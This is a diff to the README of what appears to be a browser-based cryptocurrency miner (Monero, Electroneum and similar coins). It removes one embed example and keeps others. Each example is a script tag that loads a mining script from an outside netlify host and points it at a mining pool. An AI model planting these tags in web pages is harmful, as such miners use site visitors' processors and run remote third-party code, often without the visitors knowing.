@@ -32,10 +32,6 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | INTUcoin | Lethean (IntenseC
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/0?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Stellite (Stellite V5) need ?algo=cn/xtl<br> 
-```sh
-<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/xtl?jason=Your_Favorite_Pool:PortNr" > </script>
-```
 #### Examples: CN Lite V7 Coins (Aeon, BitcoiNote, Triton) need ?algo=cn-lite/1
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
